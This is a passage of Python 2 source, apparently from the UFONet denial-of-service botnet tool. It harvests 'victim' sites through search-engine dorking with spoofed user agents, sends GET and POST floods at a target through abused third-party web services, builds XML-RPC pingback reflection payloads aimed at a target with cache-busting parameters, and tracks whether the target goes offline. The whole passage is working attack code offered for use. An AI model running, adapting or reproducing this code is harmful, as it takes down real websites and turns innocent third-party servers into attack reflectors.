        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        #    if options.verbose:
        #        print("Query used: " + url + "\n")
        #    try:
        #        req = urllib2.Request(url, None, headers)
        #        req_reply = urllib2.urlopen(req).read()
        #    except: 
        #        print('[Error] - Unable to connect to google\n')
        #        if options.allengines:
        #            return
        #        if not options.dorks:
        #            if not self.options.forceyes:
        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
        #            else:
        #                update_reply = "Y"
        #            if update_reply == "n" or update_reply == "N":
        #                return #sys.exit(2)
        #            print "\nSearch engines available:"
        #            print '-'*25
        #            for e in self.search_engines:
        #                print "+ "+e
        #            print '-'*25
        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
        #            return #sys.exit(2)
        #        else:
        #            req_reply = ''
        #    regex = '<h3 class="r"><a href="/url(.+?)">' # regex magics
        #    pattern = re.compile(regex)
        #    url_links = re.findall(pattern, req_reply)
        elif options.engine == 'yahoo': # yahoo [27/06/2017: OK!]
            #location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # generate 'flags' for location servers to evade Yahoo anti-dorking on main search webpage [grey magic: 18/08/2016]
            location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
            location = str(random.choice(location).strip()) # shuffle location
            url = 'https://'+location+'.search.yahoo.com/search?'
            if options.search: # search from query
                q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
            if options.dorks or options.autosearch: # search from a dork
                q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
            start = 0 # set index number of first entry
            query_string = { 'p':q, 'b':start }
            data = urllib.urlencode(query_string)
            url = url + data
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if options.verbose:
                print("Query used: " + url + "\n")
            try:
                req = urllib2.Request(url, None, headers)
                req_reply = urllib2.urlopen(req).read()
            except:
                print('[Error] Unable to connect to: yahoo\n')
                if options.allengines or options.autosearch:
                    return
                if not options.dorks or not options.autosearch:
                    if not self.options.forceyes:
                        update_reply = raw_input("Want to try a different search engine? (Y/n)")
                    else:
                        update_reply = "Y"
                    if update_reply == "n" or update_reply == "N":
                        return #sys.exit(2)
                    print "\nSearch engines available:"
                    print '-'*25
                    for e in self.search_engines:
                        print "+ "+e
                    print '-'*25
                    print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
                    return #sys.exit(2)
                else:
                    req_reply = ''
            #regex = '<h3 class="title"><a style="color:#2C46C7" class=" td-u" href="(.+?)" target="_blank"' # regex magics [18/08/2016]
            regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
            pattern = re.compile(regex)
            url_links = re.findall(pattern, req_reply)
        #elif options.engine == 'yandex': # yandex [07/10/2015: OK!]
        #    url = 'https://yandex.ru/search/?'
        #    if options.search: # search from query
        #        q = 'inurl:"' + str(options.search) + '"' # set query to search literally on results
        #    if options.dorks or options.autosearch: # search from a dork
        #        q = 'inurl:"' + str(dork) + '"' # set query from a dork to search literally on results
        #    start = 0 # set index number of first entry
        #    lr = '213' # [27/06/2017: OK!]
        #    query_string = { 'text':q, 'lr':lr, 'p':start }
        #    data = urllib.urlencode(query_string)
        #    url = url + data
        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        #    if options.verbose:
        #        print("Query used: " + url + "\n")
        #    try:
        #        req = urllib2.Request(url, None, headers)
        #        req_reply = urllib2.urlopen(req).read()
        #    except:
        #        print('[Error] - Unable to connect to yandex\n')
        #        if options.allengines or options.autosearch:
        #            return
        #        if not options.dorks or not options.autosearch:
        #            if not self.options.forceyes:
        #                update_reply = raw_input("Want to try a different search engine? (Y/n)")
        #            else:
        #                update_reply = "Y"
        #            if update_reply == "n" or update_reply == "N":
        #                return #sys.exit(2)
        #            print "\nSearch engines available:"
        #            print '-'*25
        #            for e in self.search_engines:
        #                print "+ "+e
        #            print '-'*25
        #            print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
        #            return #sys.exit(2)
        #        else:
        #            req_reply = ''
            #regex = '<a class="link link_cropped_no serp-item__title-link" target="_blank" href="(.+?)"' # regex magics
        #    if 'captchaSound' in req_reply: # detecting captcha reply
        #        print "[Info] - This search engine is asking for a captcha...\n"
        #        if options.allengines or options.autosearch:
        #            url_links = "" # keep running!
        #    else:
        #        regex = 'target="_blank" href="(.+?)" onmousedown="rc' # [27/06/2017] regex magics
        #        pattern = re.compile(regex)
        #        url_links = re.findall(pattern, req_reply)
        else: # no valid search engine
            print('[Error] - This search engine is not supported!\n')
            if not options.dorks or options.autosearch:
                if not self.options.forceyes:
                    update_reply = raw_input("Want to try a different search engine? (Y/n)")
                else:
                    update_reply = "Y"
                if update_reply == "n" or update_reply == "N":
                    return #sys.exit(2)
                print "\nSearch engines available:"
                print '-'*25
                for e in self.search_engines:
                    print "+ "+e
                print '-'*25
                print "\nEx: ufonet -s 'proxy.php?url=' --se 'bing'"
                return #sys.exit(2)
            else:
                req_reply = ''
        if options.num_results: # set number of results to search
            try:
                num = int(options.num_results)
            except:
                print("You should specify an integer!!!. Using default value: 10\n")
                num = 10
        else:
            num = 10
        total_results = 1
        for url in url_links: # general parse on urls
            if int(num) < int(total_results):
                break
            if options.engine == "bing":
                if " h=" in url: # regex magics [18/08/2016]
                    url = url.rsplit('" h=',1)[0]
            if options.engine == "yahoo":
                if 'RU=' in url: # regex magics [18/08/2016]
                    url = url.rsplit('RU=',1)[1] 
                if 'UTF-8&u=' in url: # regex magics [05/02/2018]
                    url = url.rsplit('UTF-8&u=',1)[1]  
            #if options.engine == "yandex":
            #    if 'rel="' in url: # regex magics [27/06/2017]
            #        url = url.rsplit('rel=',1)[1] 
            total_results = total_results + 1 # results counter
            url_link = url.strip('?q=') # parse url_links to retrieve only a url
            url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
            if options.search:
                sep = str(options.search)
            if options.dorks or options.autosearch:
                sep = str(dork)
            url_link = url_link.rsplit(sep, 1)[0] + sep
            if 'href="' in url_link:
                url_link = url_link.rsplit('href="', 1)[1]
            if "instreamset" in url_link: # invalid zombie
                url_link = "" # discarded
            if '" ' in url_link:
                url_link = url_link.rsplit('" ', 1)[1]
            if options.engine in url_link:
                url_link = "" # discarded
            if 'http' not in url_link:
                url_link = "" # discarded
            else:
                if url_link not in zombies and url_link+os.linesep not in zombies_found and url_link is not "": # AI mode (parsing search engines mixed pool and stored army)
                    print('+Victim found: ' + url_link)
                    print '-'*12
                    zombies.append(url_link)
                else:
                    pass
        if len(zombies) == 0: # print dorking results
            print "[Info] - NOT any NEW victim(s) found for this query!"
            if not options.dorks:
                if not options.autosearch:
                    if not self.options.forceyes:
                        return #sys.exit(2)
        print "\n" + '-'*44 + '\n'
        self.total_possible_zombies = self.total_possible_zombies + len(zombies)
        return zombies

    def check_nat(self):
        # check for NAT configuration
        options = self.options
        tor_reply = urllib2.urlopen("https://check.torproject.org").read() # check if TOR is enabled
        your_ip = tor_reply.split('<strong>')[1].split('</strong>')[0].strip()
        if not tor_reply or 'Congratulations' not in tor_reply:
            print("[Info] It seems that you are not using TOR to recieve data. Good!\n")
        else:
            print("[Error] You are using TOR as public IP... It's not possible to NAT!\n")
            self.nat_error_flag = "ON"
            return #sys.exit(2)
        try:
            if options.forcessl:
                data = str(urlopen('https://checkip.dyndns.com/').read()) # check for public ip
            else:
                data = str(urlopen('http://checkip.dyndns.com/').read()) # check for public ip
            self.pub_ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        except:
            try: # another check for public ip
                if options.forcessl:
                    data = str(urlopen('https://whatismyip.org/').read())
                else:
                    data = str(urlopen('http://whatismyip.org/').read())
                self.pub_ip = re.compile(r'">(\d+\.\d+\.\d+\.\d+)</span>').search(data).group(1)
            except:
                print("[Error] Something wrong checking your public IP using an external service. Try it again!\n")
                self.nat_error_flag = "ON"
                return #sys.exit(2)
        print " + Public: " + self.pub_ip + "\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 0))  # connecting to a UDP address doesn't send packets (black magic)
        self.local_ip = s.getsockname()[0]
        print " + Local: " + self.local_ip + "\n"
        print '='*22 + '\n'

    def extract_ucavs(self):
        # extract ucavs from file
        options = self.options
        try:
            f = open(self.ucavs_file)
            ucavs = f.readlines()
            ucavs = [ ucav.replace('\n','') for ucav in ucavs ]
            f.close()
            if not ucavs:
                print "\n[Error] - Imposible to retrieve 'ucavs' from file.\n"
                return
            else:
                return ucavs
        except:
            if os.path.exists(self.ucavs_file) == True:
                print '\n[Error] - Cannot open:', 'ucavs.txt', "\n"
                return #sys.exit(2)
            else:
                print '\n[Error] - Cannot found:', 'ucavs.txt', "\n"
                return #sys.exit(2)

    def check_is_up(self, target):
        # extract external status checkers, perform a request and check results
        options = self.options
        num_is_up = 0 # counter for 'up' reports
        num_is_down = 0 # counter for 'down' reports
        print "\n[Info] Flying some UCAV with 'heat-beam' weapons...\n"
        ucavs = self.extract_ucavs() # extract ucavs from file
        self.total_ucavs = len(ucavs) # add total of ucavs to stats
        shuffle(ucavs) # shuffle ucavs
        for ucav in ucavs:
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if target.startswith("http://"): # parse target for some checkers
                target = target.replace('http://','')
            elif target.startswith("https://"):
                target = target.replace('https://','')
            url = ucav + target
            if options.verbose:
                print("[Info] Sniping: " + url)
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                    req = urllib2.Request(url, None, headers)
                    target_reply = urllib2.urlopen(req).read()
                else:
                    req = urllib2.Request(url, None, headers)
                    target_reply = urllib2.urlopen(req, context=self.ctx).read()
                self.ucavs_hit = self.ucavs_hit + 1 # add ucav hit to stats
            except:
                print "[Error] UCAV: " + ucav + " -> FAILED (cannot connect!)"
                self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
                target_reply = ""
            if target_reply == "":
                pass
            else:
                if not "is down" or not "looks down" in target_reply: # parse external service for reply
                    print "[Info] UCAV: " + ucav + " -> HIT! || Report: ONLINE! [Keep shooting!]"
                    num_is_up = num_is_up + 1 
                else:
                    print "[Info] UCAV: " + ucav + " -> FAILED? || Report: Target looks OFFLINE from here!!! ;-)"
                    num_is_down = num_is_down + 1
        if num_is_down > 0 and num_is_up == 0: # check for: 1 or more down, 0 up
            print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
            if not self.options.forceyes:
                update_reply = raw_input("Want to send a [HEAD] check request from your proxy? (y/N)")
                print "\n" + '-'*25
            else:
                update_reply = "N"
            if update_reply == "y" or update_reply == "Y":
                try: # send HEAD connection
                    self.head = True
                    reply = self.connect_zombie(target)
                    self.head = False
                    if reply:
                        print "\n[Info] Wow! Target is replying you... [Keep shooting!]\n"
                    else:
                        print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
                        self.update_targets_crashed() # update targets crashed stats
                        self.update_mothership_stats() # update mothership completed attack stats
                        if self.options.web:
                            return 
                        else:
                            sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
                except Exception:
                    print "\n[Error] Something wrong with your connection!\n"
                    if self.options.verbose:
                        traceback.print_exc()
                return #sys.exit(2)
            else:
                print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
                self.update_targets_crashed() # update targets crashed stats
                self.update_mothership_stats() # update mothership completed attack stats
                if self.options.web:
                    return 
                else:
                    sys.exit(2) # Debug traceback (without crash...) for celebrate it! ;-)

    def extract_median(self, num_list):
        # extract median form a list of numbers
        num_list.sort()
        z = len(num_list)
        if not z%2:
           return (float(num_list[(z/2)-1])+float(num_list[z/2]))/2
        else:
           return float(num_list[z/2])

    def check_is_loading(self, target):
        # perform a broadband test (using GET) to analize target's reply to the traffic generated each round
        self.start = None
        self.stop = None
        print '\n---------'
        print "\n[Info] Scanning target to check for levels on defensive shields...\n"
        if target.endswith(""):
            target.replace("", "/")
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        try:
            req = urllib2.Request(target, None, headers)
            if self.options.proxy: # set proxy
                self.proxy_transport(self.options.proxy)
                self.start = time.time()
                target_reply = urllib2.urlopen(req).read()
                header = urllib2.urlopen(req).info()
                self.stop = time.time()
            else:
                self.start = time.time()
                target_reply = urllib2.urlopen(req, context=self.ctx).read()
                header = urllib2.urlopen(req).info()
                self.stop = time.time()
        except:
            print('[Error] Our scanner can not connect to the target this round... Skipping!\n')
            return 
        try:
            s, size_name = self.convert_size(len(target_reply))
            self.loadcheck_size_list.append(s) # add record to size list
            size = '%s %s' % (s,size_name)
        except:
            size = "Error!"
        try:
            time_required = self.stop - self.start
            load = self.convert_time(time_required)
            self.loadcheck_load_list.append(load) # add record to load list
        except:
            load = "Error!"
        self.loadcheck_counter = self.loadcheck_counter + 1
        print ' -Total tests:', self.loadcheck_counter, "\n"
        if self.loadcheck_prev_size is not None and self.loadcheck_prev_load is not None:
            lsm = self.extract_median(self.loadcheck_size_list)
            if lsm is not None:
                self.loadcheck_size_median = str(lsm) + " " + size_name
            else:
                self.loadcheck_size_median = None
            llm = self.extract_median(self.loadcheck_load_list)
            if llm is not None:
                self.loadcheck_load_median = str(llm) + " seconds"
            else:
                self.loadcheck_load_median = None
            if self.loadcheck_counter == 2: # first round
                print '   -Bytes in (first round)    :', self.loadcheck_first_size
                print '   -Bytes in (this round)     :', size
                if self.loadcheck_size_median is not None:
                    print '   -Bytes in (median)         :', self.loadcheck_size_median
                print ' ----'
                print '   -Load time (first round)   :', self.loadcheck_first_load, "seconds"
                print '   -Load time (this round)    :', load, "seconds"
                if self.loadcheck_load_median is not None:
                    print '   -Load time (median)        :', self.loadcheck_load_median, "\n"
                else:
                    print "\n"
                self.loadcheck_size_max = None
                self.loadcheck_size_min = None
                self.loadcheck_load_max = None
                self.loadcheck_load_min = None
            elif self.loadcheck_counter > 2: # rest of rounds
                lsmax = max(self.loadcheck_size_list)
                if lsmax is not None:
                    self.loadcheck_size_max = str(lsmax) + " " + size_name
                else:
                    self.loadcheck_size_max = None
                lsmin = min(self.loadcheck_size_list)
                if lsmin is not None:
                    self.loadcheck_size_min = str(lsmin) + " " + size_name
                else:
                    self.loadcheck_size_min = None
                llmax = max(self.loadcheck_load_list)
                if llmax is not None:
                    self.loadcheck_load_max = str(llmax) + " seconds"
                else:
                    self.loadcheck_load_max = None
                llmin = min(self.loadcheck_load_list)
                if llmin is not None:
                    self.loadcheck_load_min = str(llmin) + " seconds"
                else:
                    self.loadcheck_load_min = None
                print '   -Bytes in (first round)    :', self.loadcheck_first_size
                print '   -Bytes in (previous round) :', self.loadcheck_prev_size
                print '   -Bytes in (this round)     :', size
                if self.loadcheck_size_max is not None:
                    print '   -Bytes in (max)            :', self.loadcheck_size_max
                if self.loadcheck_size_min is not None:
                    print '   -Bytes in (min)            :', self.loadcheck_size_min
                if self.loadcheck_size_median is not None:
                    print '   -Bytes in (median)         :', self.loadcheck_size_median
                print ' ----'
                print '   -Load time (first round)   :', self.loadcheck_first_load, "seconds"
                print '   -Load time (previous round):', self.loadcheck_prev_load, "seconds"
                print '   -Load time (this round)    :', load, "seconds"
                if self.loadcheck_load_max is not None:
                    print '   -Load time (max)           :', self.loadcheck_load_max
                if self.loadcheck_load_min is not None:
                    print '   -Load time (min)           :', self.loadcheck_load_min
                if self.loadcheck_load_median is not None:
                    print '   -Load time (median)        :', self.loadcheck_load_median, "\n"
                else:
                    print "\n"
            if self.loadcheck_prev_load < load: # target is loading more slowly
                print "[Info] SCANNER: Your target is serving content more slowly this round... [Keep shooting!]\n"
            elif self.loadcheck_prev_load == load: # inmutable target
                print "[Info] SCANNER: Your attack is not having any effect on you target this round...\n"
            elif self.loadcheck_prev_load > load: # is target defending?
                print "[Info] SCANNER: Your target is loading this round faster than the previous one... o_0\n"
        else:
            print '   -Bytes in (this round) :', size
            print '   -Load time (this round):', load, "seconds\n"
            self.loadcheck_first_size = size
            self.loadcheck_first_load = load
            self.loadcheck_size_median = None
            self.loadcheck_load_median = None
            self.loadcheck_size_max = None
            self.loadcheck_size_min = None
            self.loadcheck_load_max = None
            self.loadcheck_load_min = None
        self.loadcheck_prev_size = size # record previous size
        self.loadcheck_prev_load = load # record previous load

    def convert_size(self, size):
        if (size == 0):
            return '0 B'
        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor(math.log(size,1024)))
        p = math.pow(1024,i)
        s = round(size/p,2)
        return s, size_name[i]

    def convert_time(self, time):
        return '%.2f' % time

    def send_aliens(self, target):
        # extract external web abuse services urls (POST) and perform requests against target
        options = self.options
        print "\n[Info] Deploying heavy alien troops with 'laser-cannon' weapons...\n"
        aliens = self.extract_aliens() # extract aliens from file
        self.total_aliens = len(aliens) # add total of aliens to stats
        shuffle(aliens) # shuffle aliens 
        for alien in aliens:
            if "$POST" in alien: # extract alien/parameters -> search for $POST delimiter on 'aliens.txt' file
                regex_alien = re.compile('{}(.*){}'.format(re.escape(''), re.escape(';$POST'))) # regex magics
                pattern_alien = re.compile(regex_alien)
                alien_url = re.findall(pattern_alien, alien) # HTTP POST url for submit data
                regex_param = re.compile('{}(.*){}'.format(re.escape('$POST;'), re.escape(''))) # regex magics
                pattern_param = re.compile(regex_param)
                param = re.findall(pattern_param, alien) # HTTP POST params to submit
                for u in alien_url:
                    url = u # ex: POST -> path/submit.php
                print "[Info] Firing from: " + url
                for p in param:
                    param_target = {p : target} # ex POST -> url=target
                    param_target = urllib.urlencode(param_target)
                try:
                    if options.verbose:
                        print "[Info] Sniping: " + url + " - POST:", param_target
                    req = urllib2.Request(url, param_target)
                    rsp = urllib2.urlopen(req)
                    #content = rsp.read()
                    self.aliens_hit = self.aliens_hit + 1 # add hit to aliens stats
                except Exception:
                    print "[Error] Alien: " + alien + " -> FAILED (cannot connect!)"
                    self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats

    def extract_aliens(self):
        # extract aliens from file
        options = self.options
        try:
            f = open(self.aliens_file)
            aliens = f.readlines()
            aliens = [ alien.replace('\n','') for alien in aliens ]
            f.close()
            if not aliens:
                print "\n[Error] - Imposible to retrieve 'aliens' from file.\n"
                return
            else:
                return aliens
        except:
            if os.path.exists(self.aliens_file) == True:
                print '\n[Error] - Cannot open:', 'aliens.txt', "\n"
                return #sys.exit(2)
            else:
                print '\n[Error] - Cannot found:', 'aliens.txt', "\n"
                return #sys.exit(2)

    def send_droids(self, target):
        # extract external web abuse services urls (GET) and perform requests against target
        options = self.options
        print "\n[Info] Deploying droids with 'light-laser' weapons...\n"
        droids = self.extract_droids() # extract droids from file
        self.total_droids = len(droids) # add total of droids to stats
        shuffle(droids) # shuffle droids
        target = urllib.unquote(target).decode('utf8') # parte urlencoding
        if target.startswith('http://'): # remove http
            target = target.replace('http://', '')
        if target.startswith('https://'):
            target = target.replace('https://', '') # remove https
        for droid in droids:
            if "$TARGET" in droid: # replace droid/parameter for target
                url = droid.replace("$TARGET", target)
                print "[Info] Firing from: " + url
                self.user_agent = random.choice(self.agents).strip() # shuffle user-agent 
                headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                try:
                    req = urllib2.Request(url, None, headers)
                    rsp = urllib2.urlopen(req)
                    self.droids_hit = self.droids_hit + 1 # add hit to droids stats
                except Exception:
                    print "[Error] Droid: " + url + " -> FAILED (cannot connect!)"
                    self.droids_fail = self.droids_fail + 1 # add fail to droids stats

    def extract_droids(self):
        # extract droids from file
        options = self.options
        try:
            f = open(self.droids_file)
            droids = f.readlines()
            droids = [ droid.replace('\n','') for droid in droids ]
            f.close()
            if not droids:
                print "\n[Error] - Imposible to retrieve 'droids' from file.\n"
                return
            else:
                return droids
        except:
            if os.path.exists(self.droids_file) == True:
                print '\n[Error] - Cannot open:', 'droids.txt', "\n"
                return #sys.exit(2)
            else:
                print '\n[Error] - Cannot found:', 'droids.txt', "\n"
                return #sys.exit(2)

    def send_rpcs(self, target):
        # extract vulnerable XML-RPC pingback services and perform requests against target
        print "\n[Info] Aiming 'plasma' cannon reflector turrets...\n"
        rpcs = self.extract_rpcs() # extract rpcs from file
        self.total_rpcs = len(rpcs) # add total rpcs to stats
        shuffle(rpcs) # shuffle rpcs
        def random_key(length):
            key = ''
            for i in range(length):
                key += random.choice(string.lowercase + string.uppercase + string.digits)
            return key
        for rpc in rpcs:
            print "[Info] Firing from: " + rpc
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            key = random_key(8) # generate random value page to bypass cache
            rpc_page = "?" + str(key)
            key = random_key(6) # re-generate random value id to bypass cache
            rpc_id = "=" + str(key)
            target_place = target + rpc_page + rpc_id # random place to bypass cache (ex: www.target.com?U7OvBdp1=4lMcNj)
            if "/xmlrpc.php" in rpc:
                rpc_place = rpc.replace("xmlrpc.php", "")
            rpc_exploit = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+target_place+"</string></value></param><param><value><string>"+rpc_place+"</string></value></param></params></methodCall>"
            try:
                req = urllib2.Request(rpc, rpc_exploit, headers)
                target_reply = urllib2.urlopen(req, context=self.ctx).read()
                self.rpcs_hit = self.rpcs_hit + 1 # add rpc hit to stats
                if self.options.verbose:
                    print "Reply:", target_reply
            except:
                print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
                self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats

    def extract_rpcs(self):
        # extract rpcs from file
        options = self.options
        try:
            f = open(self.rpcs_file)
            rpcs = f.readlines()
            rpcs = [ rpc.replace('\r','') for rpc in rpcs ]
            rpcs = [ rpc.replace('\n','') for rpc in rpcs ]
            f.close()
            if not rpcs:
                print "\n[Error] - Imposible to retrieve 'rpcs' from file.\n"
                return
            else:
                return rpcs
        except:
            if os.path.exists(self.rpcs_file) == True:
                print '\n[Error] - Cannot open:', 'rpcs.txt', "\n"
                return #sys.exit(2)
            else:
                print '\n[Error] - Cannot found:', 'rpcs.txt', "\n"
                return #sys.exit(2)

    def extract_zombies(self):
        # extract targets from file
        options = self.options
        if self.options.test:
            try:
                f = open(options.test)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to extract 'zombies' from file "+options.test+".\n"
                    return
                else:
                    return zombies
            except:
                if os.path.exists(options.test) == True:
                    print '\n[Error] - Cannot open:', options.test, "\n"
                    return #sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', options.test, "\n"
                    return #sys.exit(2)
        else:
            try:
                f = open(self.zombies_file)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from file.\n"
                    return
                else:
                    return zombies
            except:
                if os.path.exists(self.zombies_file) == True:
                    print '\n[Error] - Cannot open:', 'zombies.txt', "\n"
                    return #sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                    return #sys.exit(2)

    def update_zombies(self, zombies_ready):
        # update zombies on file
        options = self.options
        if options.attackme:
            f = open(self.zombies_file, "w") # re-write list
            for zombie in self.doll.real_zombies: # add only alien verified zombies
                for x in zombie:
                    f.write(str(x) + os.linesep)
            f.close()
        if options.test or options.testall:
            if not options.test:
                options.test = self.zombies_file
            f = open(options.test, "w") # re-write list only with zombies ready
            for zombie in zombies_ready:
                f.write(zombie + os.linesep)
            f.close()
        if options.search or options.dorks or options.autosearch or options.download: # append only new zombies to list (dorking supported)
            f = open(self.zombies_file)
            zombies_on_file = f.read().splitlines()
            with open(self.zombies_file, "a") as zombie_list: 
                for zombie in zombies_ready:
                    if zombie not in zombies_on_file: # parse possible repetitions
                        zombie_list.write(zombie + os.linesep)
                        if options.download:
                            self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
                        else:
                            self.scanned_zombies = self.scanned_zombies + 1 # update scanner stats only with new zombies (dorking)
            f.close()

    def update_aliens(self, aliens_ready):
        # update aliens on file
        options = self.options
        if options.download: # append only new aliens to list
            f = open(self.aliens_file)
            aliens_on_file = f.read().splitlines()
            with open(self.aliens_file, "a") as alien_list:
                for alien in aliens_ready:
                    if alien not in aliens_on_file: # parse possible repetitions
                        alien_list.write(alien + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_droids(self, droids_ready):
        # update droids on file
        options = self.options
        if options.download: # append only new droids to list
            f = open(self.droids_file)
            droids_on_file = f.read().splitlines()
            with open(self.droids_file, "a") as droid_list:
                for droid in droids_ready:
                    if droid not in droids_on_file: # parse possible repetitions
                        droid_list.write(droid + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_ucavs(self, ucavs_ready):
        # update ucavs on file
        options = self.options
        if options.download: # append only new ucavs to list
            f = open(self.ucavs_file)
            ucavs_on_file = f.read().splitlines()
            with open(self.ucavs_file, "a") as ucav_list:
                for ucav in ucavs_ready:
                    if ucav not in ucavs_on_file: # parse possible repetitions
                        ucav_list.write(ucav + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_rpcs(self, rpcs_ready):
        # update rpcs on file
        options = self.options
        if options.testrpc or options.testall:
            f = open(self.rpcs_file, "w") # re-write list
            for rpc in rpcs_ready: # add only rpc verified zombies
                f.write(rpc + os.linesep)
            f.close()
        if options.download: # append only new rpcs to list
            f = open(self.rpcs_file)
            rpcs_on_file = f.read().splitlines()
            with open(self.rpcs_file, "a") as rpc_list:
                for rpc in rpcs_ready:
                    if rpc not in rpcs_on_file: # parse possible repetitions
                        rpc_list.write(rpc + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def search_rpc(self, rpc_host):
        rpc_vulnerable = False
        rpc_pingback_url = False
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        try:
            if self.options.testall: # testing_all
                req = urllib2.Request(rpc_host, None, headers)
                rpc_code = urllib2.urlopen(req).read()
                rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                for link in rpc_links:
                    if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
                        rpc_pingback_url = link[0]
                        rpc_vulnerable = True
                        break # found it!
                    else: # not any XML-RPC discovering methods are working
                        rpc_pingback_url = rpc_host + "/xmlrpc.php"
                        rpc_vulnerable = False
            else:
                if rpc_host.startswith("http://"):
                    rpc_host = rpc_host.replace("http://", "")
                if rpc_host.startswith("https://"):
                    rpc_host = rpc_host.replace("https://", "")
                rpc_host = urlparse(rpc_host)
                rpc_path = rpc_host.path.replace("\r", "")
                self.head = True # send HTTP HEAD request searching for: X-Pingback
                reply = self.connect_zombie(rpc_path)
                self.head = False
                if "X-Pingback" in reply: # discovering pingback-enabled resources
                    m = re.search('X-Pingback: (.+?)\n', reply) # regex magics
                    rpc_pingback_url = m.group(1) # extract rpc server url
                    rpc_vulnerable = True
                else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
                    req_rpc = urllib2.Request(rpc_host, None, headers)
                    req_rpc.get_method = lambda : 'GET'
                    rpc_code = urllib2.urlopen(req_rpc).read()
                    rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                    for link in rpc_links:
                        if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
                            rpc_pingback_url = link[0]
                            rpc_vulnerable = True
                            break # found it!
                        else: # not any XML-RPC discovering methods are working
                            rpc_pingback_url = rpc_host + "/xmlrpc.php"
                            rpc_vulnerable = False
        except: # something wrong discovering XML-RPC Pingback
            pass
        return rpc_vulnerable, rpc_pingback_url

    def testing_offline(self):
        # check for zombies offline
        print ("\nChecking for 'zombies' offline!\n")
        print '='*35
        zombies_online = 0
        zombies_offline = 0
        zombies = self.extract_zombies()
        rpcs = self.extract_rpcs()
        aliens = self.extract_aliens()
        droids = self.extract_droids()
        ucavs = self.extract_ucavs()
        try:
            botnet = zombies + rpcs + aliens + droids + ucavs
        except:
            return
        discarded = [] # for discarded zombies
        if not botnet:
            return
        self.head = True
        for zombie in botnet:
            zombie = str(zombie)
            if zombie in zombies: # set zombie type (this way because cannot be same zombie with different type)
                zombie_type = 'Zombie'
            elif zombie in rpcs:
                zombie_type = 'XML-RPC'
            elif zombie in aliens:
                zombie_type = 'Alien'
            elif zombie in droids:
                zombie_type = 'Droid'
            elif zombie in ucavs:
                zombie_type = 'UCAV'
            t = urlparse(zombie)
            name_zombie = t.netloc
            if zombie_type == 'Alien': # 'Aliens' are made with keyword ;$POST;
                sep = ';$POST;'
                zombie = zombie.split(sep, 1)[0]
            reply = str(self.connect_zombie(zombie))
            if reply == "200" or reply == "302" or reply == "301" or reply == "401" or reply == "403" or reply == "405" or reply == '500':
                status = "ONLINE!"
                zombies_online = zombies_online + 1
            else:
                status = "NOT Working!"
                zombies_offline = zombies_offline + 1
